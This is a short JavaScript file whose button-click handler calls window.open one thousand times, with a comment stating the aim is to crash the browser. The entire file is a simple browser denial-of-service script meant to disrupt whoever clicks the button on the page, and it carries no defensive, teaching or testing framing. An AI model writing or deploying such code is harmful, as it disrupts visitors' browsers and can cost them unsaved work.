// script.js

// Function to open a new window
function openWindow() {
    window.open('about:blank', '_blank');
}

// Function to open multiple windows
function openMultipleWindows(numWindows) {
    for (let i = 0; i < numWindows; i++) {
        openWindow();
    }
}

// Event listener for the button click
document.getElementById('openWindows').addEventListener('click', () => {
    // Open a large number of windows to crash the browser
    openMultipleWindows(1000);
});